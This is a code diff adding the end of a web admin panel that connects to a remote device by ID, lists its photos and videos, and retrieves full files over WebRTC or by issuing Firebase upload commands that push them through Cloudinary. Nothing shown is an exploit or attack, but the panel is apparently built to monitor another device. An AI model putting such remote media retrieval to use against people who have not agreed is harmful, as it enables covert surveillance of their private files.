+        const dlBtn = document.createElement('button');
+        dlBtn.className = 'dl-btn';
+        dlBtn.textContent = '⬇';
+        dlBtn.onclick = e => { e.stopPropagation(); downloadItem(item, false); };
+        div.appendChild(dlBtn);
+
+        div.onclick = () => openLightbox(item);
+        grid.appendChild(div);
+      });
+
+      // Show/hide Load More button
+      showLM(hasMore);
+
+      if (!hasMore && items.length > 0) {
+        // Show "all loaded" message at bottom
+        const done = document.createElement('div');
+        done.style.cssText = 'grid-column:1/-1;text-align:center;color:var(--muted);font-size:12px;padding:10px';
+        done.textContent = '✅ All ' + galleryTab + ' loaded';
+        grid.appendChild(done);
+      }
+    }
+
+    function showLM(show) {
+      document.getElementById('loadMoreWrap').style.display = show ? 'block' : 'none';
+    }
+
+    // ── DOWNLOAD — HYBRID (WebRTC + Cloudinary Fallback) ──────────────────────
+    let cloudinaryUnsub = null;
+    let p2pFallbackTimer = null;
+    let p2pLastChunkTime = 0;
+
+    function downloadItem(item, forLightbox = false) {
+      isDownloadingForLightbox = forLightbox;
+
+      // Clear any previous fallback timer
+      if (p2pFallbackTimer) clearTimeout(p2pFallbackTimer);
+
+      // Step 1: Try DataChannel (Fastest P2P)
+      if (dataChannel && dataChannel.readyState === 'open') {
+        setConn('Starting P2P download...');
+        if (forLightbox) setLightboxStatus('⏳ P2P Download... 0%');
+
+        dataChannel.send('download:' + item.path);
+
+        // Setup Progress UI
+        document.getElementById('dlFileName').textContent = item.name;
+        document.getElementById('dlPercent').textContent = '0%';
+        document.getElementById('dlBar').style.width = '0%';
+        document.getElementById('dlProgress').className = 'dl-progress show';
+
+        // Reset chunk tracking
+        dlReceived = 0;
+        dlHeader = null;
+        p2pLastChunkTime = Date.now();
+
+        // Start monitoring for P2P failures
+        monitorP2PProgress(item, forLightbox);
+
+      } else {
+        // Step 2: Fallback to Cloudinary (Reliable CDN)
+        startCloudinaryDownload(item, forLightbox);
+      }
+    }
+
+    function monitorP2PProgress(item, forLightbox) {
+      const checkInterval = setInterval(() => {
+        const now = Date.now();
+        const timeSinceLastChunk = now - p2pLastChunkTime;
+
+        // If no chunks for 3 seconds, assume P2P failed and fallback
+        if (timeSinceLastChunk > 3000 && dlReceived === 0) {
+          clearInterval(checkInterval);
+          console.log("P2P not responding, switching to Cloudinary...");
+          startCloudinaryDownload(item, forLightbox);
+          return;
+        }
+
+        // If transfer started but stalled for 5 seconds
+        if (dlReceived > 0 && timeSinceLastChunk > 5000 && dlReceived < dlTotalChunks) {
+          clearInterval(checkInterval);
+          console.log("P2P stalled, switching to Cloudinary...");
+          startCloudinaryDownload(item, forLightbox);
+          return;
+        }
+
+        // If P2P completed successfully
+        if (dlHeader && dlReceived >= dlTotalChunks) {
+          clearInterval(checkInterval);
+        }
+      }, 1000);
+
+      // Overall timeout: 15 seconds
+      p2pFallbackTimer = setTimeout(() => {
+        clearInterval(checkInterval);
+        if (dlReceived < dlTotalChunks) {
+          console.log("P2P timeout, switching to Cloudinary...");
+          startCloudinaryDownload(item, forLightbox);
+        }
+      }, 15000);
+    }
+
+    async function startCloudinaryDownload(item, forLightbox) {
+      if (!isOnline) {
+        alert("Device is offline. Cannot initiate upload.");
+        return;
+      }
+
+      setConn('⏳ Requesting Cloud upload...');
+      if (forLightbox) setLightboxStatus('⏳ Cloud Upload... starting');
+
+      // UI reset
+      document.getElementById('dlFileName').textContent = item.name;
+      document.getElementById('dlPercent').textContent = '0%';
+      document.getElementById('dlBar').style.width = '0%';
+      document.getElementById('dlProgress').className = 'dl-progress show';
+
+      // Clear old download data to avoid stale URLs
+      try { await remove(ref(db, `downloads/${deviceId}`)); } catch (e) { }
+
+      // Send command: "upload_cloudinary:/path/to/file"
+      const cmd = `upload_cloudinary:${item.path}`;
+      await set(ref(db, `commands/${deviceId}`), cmd);
+
+      // Listen for status and URL
+      if (cloudinaryUnsub) cloudinaryUnsub();
+      cloudinaryUnsub = onValue(ref(db, `downloads/${deviceId}`), snap => {
+        const data = snap.val();
+        if (!data) return;
+
+        if (data.status) {
+          const status = data.status; // e.g. "Uploading... 45%"
+          const pctMatch = status.match(/(\d+)%/);
+          const pct = pctMatch ? pctMatch[1] : 0;
+
+          document.getElementById('dlPercent').textContent = pct + '%';
+          document.getElementById('dlBar').style.width = pct + '%';
+
+          const statusMsg = `⏳ Uploading to cloud... (${pct}%)`;
+          setConn(statusMsg);
+          if (forLightbox) setLightboxStatus(statusMsg);
+        }
+
+        if (data.error) {
+          const errorMsg = "❌ Upload failed: " + data.error;
+          setConn(errorMsg);
+          if (forLightbox) setLightboxStatus(errorMsg);
+          if (cloudinaryUnsub) { cloudinaryUnsub(); cloudinaryUnsub = null; }
+          alert("Cloudinary Upload Failed. Try again.");
+          document.getElementById('dlProgress').className = 'dl-progress';
+        }
+
+        if (data.url) {
+          const url = data.url;
+          const completeMsg = "✅ Upload complete, downloading...";
+          setConn(completeMsg);
+          if (forLightbox) setLightboxStatus(completeMsg);
+
+          // Success - Trigger Browser Download
+          triggerBrowserDownload(url, item.name);
+
+          // Cleanup
+          if (cloudinaryUnsub) { cloudinaryUnsub(); cloudinaryUnsub = null; }
+          // Remove from Firebase after a short delay
+          setTimeout(() => remove(ref(db, `downloads/${deviceId}`)), 5000);
+          document.getElementById('dlProgress').className = 'dl-progress';
+        }
+      });
+
+      // Timeout for Cloudinary: 30 seconds
+      setTimeout(() => {
+        if (cloudinaryUnsub) {
+          setConn('⏳ Upload taking too long. Try again.');
+          if (forLightbox) setLightboxStatus('⏳ Upload taking too long.');
+        }
+      }, 30000);
+    }
+
+    async function triggerBrowserDownload(url, name) {
+      if (isDownloadingForLightbox) {
+        isDownloadingForLightbox = false;
+        const med = document.getElementById('lightboxMedia');
+        med.innerHTML = '';
+        const isImage = (/\.(jpg|jpeg|png|gif|webp)$/i).test(name);
+
+        if (isImage) {
+          const img = new Image();
+          img.src = url;
+          img.crossOrigin = "anonymous";
+          img.style.cssText = 'max-width:92vw;max-height:75vh;border-radius:8px;object-fit:contain';
+          img.onload = () => {
+            setLightboxStatus('');
+            const btn = document.getElementById('lightboxDlBtn');
+            btn.disabled = false;
+            btn.textContent = '⬇ Download Full';
+            btn.setAttribute('data-url', url);
+            btn.setAttribute('data-name', name);
+          };
+          med.appendChild(img);
+        } else {
+          const vid = document.createElement('video');
+          vid.src = url; vid.controls = true;
+          vid.style.cssText = 'max-width:92vw;max-height:75vh;border-radius:8px';
+          med.appendChild(vid);
+          setLightboxStatus('');
+          const btn = document.getElementById('lightboxDlBtn');
+          btn.disabled = false; btn.textContent = '⬇ Download Full';
+          btn.setAttribute('data-url', url); btn.setAttribute('data-name', name);
+        }
+      } else {
+        // FIX: Force download for images using Blob
+        const isImage = (/\.(jpg|jpeg|png|gif|webp)$/i).test(name);
+        if (isImage) {
+          try {
+            const resp = await fetch(url);
+            const blob = await resp.blob();
+            const blobUrl = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = blobUrl;
+            a.download = name;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(blobUrl);
+          } catch (e) {
+            console.error("Blob download failed, fallback to direct", e);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = name;
+            a.target = "_blank";
+            a.click();
+          }
+        } else {
+          // Video or other: Keep original behavior
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = name;
+          a.target = "_blank";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        }
+      }
+    }
+
+    // FIX: Process queue when DataChannel opens
+    function processDownloadQueue() {
+      while (downloadQueue.length > 0) {
+        const { item, forLightbox } = downloadQueue.shift();
+        downloadItem(item, forLightbox);
+      }
+    }
+
+    // ── LIGHTBOX ───────────────────────────────────────────────────────────────
+    function openLightbox(item) {
+      lightboxItem = item;
+      const med = document.getElementById('lightboxMedia');
+      const dlBtn = document.getElementById('lightboxDlBtn');
+      med.innerHTML = '';
+
+      if (item.thumb) {
+        const img = document.createElement('img');
+        img.src = 'data:image/jpeg;base64,' + item.thumb;
+        img.style.cssText = 'max-width:92vw;max-height:75vh;border-radius:8px;object-fit:contain;filter:blur(1px);opacity:.7';
+        med.appendChild(img);
+        const hint = document.createElement('p');
+        hint.style.cssText = 'color:var(--muted);font-size:12px;margin-top:8px;text-align:center';
+        hint.textContent = item.type === 'video' ? '🎬 Video preview — Download for full file' : '🖼️ Preview — Download for full quality';
+        med.appendChild(hint);
+      } else {
+        const ph = document.createElement('div');
+        ph.style.cssText = 'font-size:60px;text-align:center;padding:40px';
+        ph.textContent = item.type === 'video' ? '🎬' : '🖼️';
+        med.appendChild(ph);
+      }
+
+      dlBtn.disabled = false;
+      dlBtn.textContent = '⬇ Download Full';
+      dlBtn.removeAttribute('data-url');
+      dlBtn.removeAttribute('data-name');
+      setLightboxStatus('');
+      document.getElementById('lightbox').className = 'lightbox show';
+    }
+
+    function closeLightbox() {
+      if (isDownloadingForLightbox) {
+        if (!confirm('Download in progress. Close anyway?')) return;
+        isDownloadingForLightbox = false;
+      }
+      document.getElementById('lightbox').className = 'lightbox';
+      document.getElementById('lightboxMedia').innerHTML = '';
+      setLightboxStatus('');
+      lightboxItem = null;
+    }
+
+    async function lightboxDownload() {
+      if (!lightboxItem) return;
+      const btn = document.getElementById('lightboxDlBtn');
+      const existingUrl = btn.getAttribute('data-url');
+      const name = btn.getAttribute('data-name') || lightboxItem.name || 'file';
+
+      if (existingUrl) {
+        // FIX: Also use force download here for images
+        const isImage = (/\.(jpg|jpeg|png|gif|webp)$/i).test(name);
+        if (isImage) {
+          try {
+            const resp = await fetch(existingUrl);
+            const blob = await resp.blob();
+            const blobUrl = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = blobUrl;
+            a.download = name;
+            a.click();
+            URL.revokeObjectURL(blobUrl);
+            return;
+          } catch (e) { console.error(e); }
+        }
+
+        const a = document.createElement('a');
+        a.href = existingUrl;
+        a.download = name;
+        a.click();
+        return;
+      }
+      btn.disabled = true;
+      btn.textContent = '⏳ Wait...';
+      setLightboxStatus('🔄 Starting download...');
+      downloadItem(lightboxItem, true);
+    }
+
+    function setLightboxStatus(msg) {
+      const el = document.getElementById('lightboxStatus');
+      el.textContent = msg;
+      el.style.display = msg ? 'block' : 'none';
+    }
+
+    // ── HELPERS ────────────────────────────────────────────────────────────────
+    function closePeerConnection() {
+      if (iceUnsub) { iceUnsub(); iceUnsub = null; }
+      if (answerUnsub) { answerUnsub(); answerUnsub = null; }
+      if (dataChannel) { try { dataChannel.close(); } catch (e) { } dataChannel = null; }
+      if (pc) { try { pc.close(); } catch (e) { } pc = null; }
+      // FIX: Clean up Firebase nodes on close
+      try {
+        remove(ref(db, `ice/${deviceId}/admin`)).catch(() => { });
+        remove(ref(db, `offers/${deviceId}`)).catch(() => { });
+      } catch (e) { }
+    }
+
+    function showEmpty(msg) {
+      const el = document.getElementById('galleryEmpty');
+      el.querySelector('div').textContent = msg || 'No items found. Press Refresh to load gallery.';
+      el.style.display = msg ? 'block' : 'none';
+    }
+
+    function setConn(msg) { document.getElementById('connInfoText').textContent = 'Status: ' + msg; }
+    function showScreen(id) {
+      document.querySelectorAll('.screen').forEach(s => s.className = 'screen');
+      document.getElementById(id).className = 'screen active';
+    }
+    function showRefreshSpinner(show) {
+      document.getElementById('refreshSpinner').style.display = show ? 'inline-block' : 'none';
+    }
+    function setLoginMsg(msg) { document.getElementById('loginMsg').textContent = msg; }
+
+    function logout() {
+      localStorage.removeItem('deviceId');
+      closePeerConnection();
+      if (statusUnsub) { statusUnsub(); statusUnsub = null; }
+      if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+      if (galleryReadyUnsub) { galleryReadyUnsub(); galleryReadyUnsub = null; }
+      deviceId = ''; allImages = []; allVideos = []; isOnline = false; downloadQueue = [];
+      showScreen('loginScreen');
+    }
+
+
+
+
+
+    // Auto-fill saved ID and auto-connect
+    const saved = localStorage.getItem('deviceId');
+    if (saved) {
+      document.getElementById('deviceIdInput').value = saved;
+      // Auto-connect on load if we have a saved ID
+      deviceId = saved;
+      showScreen('monitorScreen');
+      startStatusPolling();
+      setConn('Reconnecting to saved device...');
+    }
+  </script>
+</body>
+
+</html>
